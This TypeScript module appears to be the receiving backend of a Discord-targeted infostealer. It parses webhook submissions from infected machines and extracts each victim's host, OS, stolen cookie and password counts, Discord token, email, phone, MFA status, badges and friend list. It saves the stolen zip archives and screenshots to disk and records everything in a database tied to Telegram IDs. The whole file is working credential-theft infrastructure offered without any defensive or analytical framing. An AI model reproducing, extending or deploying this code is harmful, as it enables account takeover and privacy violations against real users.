import fs from "fs";
import path from "path";
import {
  addStealLog,
  hitsDir,
  latestStealLog,
  updateStealLog,
} from "@/lib/db";

export type StealHit = {
  kind: "session" | "account" | "friends" | "screen" | "other";
  host?: string;
  os?: string;
  cookies?: number;
  passwords?: number;
  username?: string;
  discordId?: string;
  token?: string;
  email?: string;
  phone?: string;
  mfa?: string;
  badges?: string;
  hqFriends?: number;
  friends?: Array<{ user: string; badges: string }>;
};

function walkContent(node: unknown, out: string[]) {
  if (node == null) return;
  if (Array.isArray(node)) {
    for (const x of node) walkContent(x, out);
    return;
  }
  if (typeof node !== "object") return;
  const o = node as Record<string, unknown>;
  if (typeof o.content === "string") out.push(o.content);
  if (o.components) walkContent(o.components, out);
  for (const v of Object.values(o)) {
    if (v && typeof v === "object") walkContent(v, out);
  }
}

function textsFromPayload(payload: unknown): string[] {
  const out: string[] = [];
  walkContent(payload, out);
  return out;
}

function sumBrowser(block: string) {
  let cookies = 0;
  let passwords = 0;
  for (const m of block.matchAll(/\bC:\s*(\d+)/gi)) cookies += Number(m[1]) || 0;
  for (const m of block.matchAll(/\bP:\s*(\d+)/gi)) passwords += Number(m[1]) || 0;
  return { cookies, passwords };
}

function parseFriendLines(blob: string) {
  const friends: Array<{ user: string; badges: string }> = [];
  const title = blob.match(/HQ Friends\s*\((\d+)(?:\/(\d+))?\)/i);
  const old = blob.match(/HQ Friends\s+``(\d+)``/i);
  const hqFriends = title ? Number(title[1]) || 0 : old ? Number(old[1]) || 0 : 0;
  const cleaned = blob
    .replace(/Total Friends\s+``\d+``/gi, "")
    .replace(/HQ Friends\s+``\d+``/gi, "")
    .replace(/HQ Friends\s*\(\d+(?:\/\d+)?\)/gi, "");
  const re = /(?:([^`\n|]+)\|\s*)?``([^`]+)``/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(cleaned))) {
    const user = m[2].trim();
    if (!user) continue;
    const badges = (m[1] || "").trim().replace(/\|\s*$/, "").trim();
    if (friends.some((f) => f.user === user && f.badges === badges)) continue;
    friends.push({ user, badges });
  }
  return { hqFriends: hqFriends || friends.length, friends };
}

export function parseStealPayload(payload: unknown): StealHit | null {
  const texts = textsFromPayload(payload);
  if (!texts.length) return null;
  const blob = texts.join("\n");

  if (/###\s*Screen\b/i.test(blob)) {
    return { kind: "screen" };
  }

  const nu = blob.match(/###\s*NEW USER\s*\|\s*(.+?)\s*\(\s*(.+?)\s*\)/i);
  if (nu) {
    const browser = texts.find((t) => /###\s*Browser Data/i.test(t)) || blob;
    const { cookies, passwords } = sumBrowser(browser);
    return {
      kind: "session",
      host: nu[1].trim(),
      os: nu[2].trim(),
      cookies,
      passwords,
    };
  }

  const acc = blob.match(/###\s*Account\s*\|\s*\[@([^\s(]+)\s*\(([^)\]]+)\)\]/i);
  if (acc) {
    let token = "";
    for (const t of texts) {
      const tm = t.match(/```([A-Za-z0-9._-]{20,})```/);
      if (tm) {
        token = tm[1];
        break;
      }
    }
    const email = blob.match(/\*\*Email:\*\*\s*``([^`]*)``/i)?.[1] ?? "";
    const phone = blob.match(/\*\*Phone:\*\*\s*``([^`]*)``/i)?.[1] ?? "";
    const mfa = blob.match(/\*\*MFA:\*\*\s*``([^`]*)``/i)?.[1] ?? "";
    let badges = "";
    for (const t of texts) {
      const bm = t.match(/``[^`]+``\s*(\|.+)/);
      if (bm) {
        badges = bm[1].replace(/^\|\s*/, "").trim();
        break;
      }
    }
    return {
      kind: "account",
      username: acc[1].trim(),
      discordId: acc[2].trim(),
      token,
      email,
      phone,
      mfa,
      badges,
    };
  }

  if (
    /###\s*Friend List\s*\|/i.test(blob) ||
    /###\s*HQ Friends/i.test(blob) ||
    /HQ Friends\s*\(\d+/i.test(blob) ||
    /HQ Friends\s+``\d+``/i.test(blob)
  ) {
    const { hqFriends, friends } = parseFriendLines(blob);
    return { kind: "friends", hqFriends, friends };
  }

  return { kind: "other" };
}

function boundaryOf(ct: string) {
  const m = ct.match(/boundary=(?:"([^"]+)"|([^;\s]+))/i);
  return m?.[1] || m?.[2] || "";
}

function idxOf(buf: Buffer, needle: Buffer, from = 0) {
  return buf.indexOf(needle, from);
}

function isPng(data: Buffer, filename: string, head: string) {
  const name = filename.toLowerCase();
  if (name.endsWith(".png") || name === "screen.png") return true;
  if (head.toLowerCase().includes("image/png")) return true;
  return data.length > 8 && data[0] === 0x89 && data[1] === 0x50 && data[2] === 0x4e && data[3] === 0x47;
}

export type ParsedBody = {
  payload: unknown | null;
  zip: Buffer | null;
  zipName: string;
  png: Buffer | null;
  pngName: string;
  rawKind: string;
};

export function splitWebhookBody(body: Buffer, contentType: string): ParsedBody {
  const empty: ParsedBody = {
    payload: null,
    zip: null,
    zipName: "",
    png: null,
    pngName: "",
    rawKind: "raw",
  };
  const ct = contentType.toLowerCase();
  if (ct.includes("multipart/form-data")) {
    const boundary = boundaryOf(contentType);
    if (!boundary) return { ...empty, rawKind: "multipart" };
    const delim = Buffer.from(`--${boundary}`);
    let payload: unknown | null = null;
    let zip: Buffer | null = null;
    let zipName = "";
    let png: Buffer | null = null;
    let pngName = "";
    let pos = 0;
    while (pos < body.length) {
      const start = idxOf(body, delim, pos);
      if (start < 0) break;
      let partStart = start + delim.length;
      if (body[partStart] === 45 && body[partStart + 1] === 45) break;
      if (body[partStart] === 13 && body[partStart + 1] === 10) partStart += 2;
      const next = idxOf(body, delim, partStart);
      if (next < 0) break;
      let part = body.subarray(partStart, next);
      if (part.length >= 2 && part[part.length - 2] === 13 && part[part.length - 1] === 10) {
        part = part.subarray(0, part.length - 2);
      }
      const sep = idxOf(part, Buffer.from("\r\n\r\n"));
      if (sep < 0) {
        pos = next;
        continue;
      }
      const head = part.subarray(0, sep).toString("utf8");
      const data = part.subarray(sep + 4);
      const name = head.match(/name="([^"]+)"/i)?.[1] || "";
      const filename = head.match(/filename="([^"]+)"/i)?.[1] || "";
      if (name === "payload_json") {
        try {
          payload = JSON.parse(data.toString("utf8"));
        } catch {
          payload = null;
        }
      } else if (isPng(data, filename, head) && data.length > 64) {
        png = Buffer.from(data);
        pngName = filename || "screen.png";
      } else if (filename.toLowerCase().endsWith(".zip") || (head.toLowerCase().includes("application/zip") && data.length > 4)) {
        zip = Buffer.from(data);
        zipName = filename || "hit.zip";
      } else if (/^files\[\d+]$/i.test(name) && data.length > 100 && !filename.toLowerCase().match(/\.(png|jpe?g|gif|webp)$/)) {
        if (data[0] === 0x50 && data[1] === 0x4b) {
          zip = Buffer.from(data);
          zipName = filename || "hit.zip";
        }
      }
      pos = next;
    }
    return { payload, zip, zipName, png, pngName, rawKind: "multipart" };
  }
  if (ct.includes("application/json") || body[0] === 0x7b) {
    try {
      return {
        payload: JSON.parse(body.toString("utf8")),
        zip: null,
        zipName: "",
        png: null,
        pngName: "",
        rawKind: "json",
      };
    } catch {
      return { ...empty, rawKind: "json" };
    }
  }
  return empty;
}

function mergeMeta(prev: string | null | undefined, patch: Record<string, unknown>) {
  let base: Record<string, unknown> = {};
  try {
    base = JSON.parse(prev || "{}");
    if (!base || typeof base !== "object" || Array.isArray(base)) base = {};
  } catch {
    base = {};
  }
  return JSON.stringify({ ...base, ...patch });
}

export async function persistSteal(
  tgId: number,
  ip: string,
  body: Buffer,
  contentType: string,
) {
  const { payload, zip, zipName, png, pngName, rawKind } = splitWebhookBody(body, contentType);
  if (!payload) return;
  const hit = parseStealPayload(payload);
  if (!hit || hit.kind === "other") return;

  if (hit.kind === "session") {
    const created = await addStealLog({
      tgId,
      host: hit.host,
      os: hit.os,
      ip,
      cookies: hit.cookies,
      passwords: hit.passwords,
      rawKind,
      metaJson: JSON.stringify({ zipName }),
    });
    if (created?.id && zip && zip.length > 0) {
      const dir = hitsDir();
      fs.mkdirSync(dir, { recursive: true });
      const rel = path.join("hits", `${created.id}.zip`);
      const abs = path.join(dir, `${created.id}.zip`);
      fs.writeFileSync(abs, zip);
      await updateStealLog(created.id, { zip_path: rel });
    }
    return;
  }

  const latest = await latestStealLog(tgId, 3600);
  if (!latest) {
    if (hit.kind === "account") {
      await addStealLog({
        tgId,
        ip,
        username: hit.username,
        discordId: hit.discordId,
        token: hit.token,
        email: hit.email,
        phone: hit.phone,
        mfa: hit.mfa,
        badges: hit.badges,
        rawKind,
      });
    }
    return;
  }

  if (hit.kind === "screen") {
    if (png && png.length > 0) {
      const dir = hitsDir();
      fs.mkdirSync(dir, { recursive: true });
      const rel = path.join("hits", `${latest.id}.png`).replace(/\\/g, "/");
      const abs = path.join(dir, `${latest.id}.png`);
      fs.writeFileSync(abs, png);
      await updateStealLog(latest.id, {
        meta_json: mergeMeta(latest.meta_json, {
          screen_path: rel,
          pngName: pngName || "screen.png",
        }),
      });
    }
    return;
  }

  if (hit.kind === "account") {
    await updateStealLog(latest.id, {
      username: hit.username || latest.username,
      discord_id: hit.discordId || latest.discord_id,
      token: hit.token || latest.token,
      email: hit.email || latest.email,
      phone: hit.phone || latest.phone,
      mfa: hit.mfa || latest.mfa,
      badges: hit.badges || latest.badges,
      ip: ip || latest.ip,
    });
    return;
  }

  if (hit.kind === "friends") {
    let prev: Array<{ user: string; badges: string }> = [];
    try {
      prev = JSON.parse(latest.friends_json || "[]");
      if (!Array.isArray(prev)) prev = [];
    } catch {
      prev = [];
    }
    const map = new Map<string, { user: string; badges: string }>();
    for (const f of prev) map.set(f.user, f);
    for (const f of hit.friends || []) map.set(f.user, f);
    const merged = [...map.values()];
    await updateStealLog(latest.id, {
      hq_friends: hit.hqFriends || merged.length,
      friends_json: JSON.stringify(merged),
    });
  }
}
